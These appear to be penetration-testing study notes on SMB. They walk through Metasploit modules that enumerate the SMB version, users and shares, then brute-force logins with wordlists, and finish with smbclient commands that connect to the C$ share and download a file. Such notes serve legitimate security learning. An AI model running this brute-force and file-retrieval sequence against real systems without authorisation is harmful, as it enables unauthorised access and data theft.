## Overview

- **SMB (Server Message Block)**: Network protocol for file, printer, and resource sharing over LAN.
- **Primary Port**: `445/TCP` (modern SMB directly over TCP).
- **Legacy Port**: `139/TCP` (SMB over NetBIOS â€” older Windows systems).
- **Linux Implementation**: **Samba** â€” enables interoperability between Linux and Windows systems. (allows Windows systems to access Linux shares and devices)

## Key Enumeration Goals

- Identify SMB dialect/version
- List accessible shares (e.g., `C$`, `ADMIN$`, `IPC$`)
- Enumerate valid usernames
- Test for weak or default credentials

## Metasploit Auxiliary Modules

```msf
# Enumerate SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# List shares (requires credentials or guest access)
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.10
run

# Enumerate users via SMB
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.10
run

# Brute-force SMB login
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.10
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt
run
```

---
---
# SMB Enumeration & Access Workflow

## 1. Set Target Globally
```msf
setg RHOSTS 192.168.1.10
```

## 2. Enumerate SMB Version
```msf
use auxiliary/scanner/smb/smb_version
run
```
â†’ Identifies if target is **Windows** or **Linux (Samba)** and SMB dialect (e.g., SMB2, SMB3).

## 3. Enumerate Users
```msf
use auxiliary/scanner/smb/smb_enumusers
run
```
â†’ May reveal valid usernames like `admin`, `guest`, etc.

## 4. Enumerate Shares
```msf
use auxiliary/scanner/smb/smb_enumshares
run
```
â†’ Lists accessible shares (e.g., `C$`, `IPC$`, `backups`).

## 5. Brute-Force Password for `admin`
```msf
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/darkweb2017-top100.txt
run
```
â†’ If successful, you now have valid credentials.

## 6. Interact via `smbclient` (Outside Metasploit)

### List Shares
```bash
smbclient -L \\\\192.168.1.10\\ -U admin (-L to list shares)
```

> **Why four backslashes?**  
> - Shell interprets `\` as an escape character.  
> - `\\\\` â†’ becomes `\\` after shell parsing.  
> - SMB UNC path requires `\\IP\share` â†’ so `\\\\IP\\` in bash = `\\IP\`.

### Connect to a Share
```bash
smbclient \\\\192.168.1.10\\C$ -U admin
```
â†’ Enter password when prompted.

### Download File
```smb
smb: \> get secret.txt
```
â†’ File saved to current local directory.

> ğŸ’¡ Use `ls`, `cd`, `get`, `put` inside `smbclient` just like FTP.

---
---
